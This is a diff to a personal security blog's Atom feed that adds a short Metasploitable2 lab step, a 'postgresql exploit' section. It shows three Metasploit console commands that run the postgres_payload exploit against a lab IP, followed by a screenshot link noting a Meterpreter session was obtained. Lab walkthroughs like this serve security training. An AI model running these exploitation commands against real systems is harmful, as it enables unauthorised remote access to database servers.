@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-22T16:05:50-05:00</updated>
+  <updated>2016-06-22T16:42:58-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -469,6 +469,20 @@
 <p>get the root:</p>
 
 <p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>postgresql exploit</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/postgres/postgres_payload
+</span><span class='line'>msf exploit(postgres_payload) &gt; set rhost 192.168.79.179
+</span><span class='line'>msf exploit(postgres_payload) &gt; exploit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>get meterpreter:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
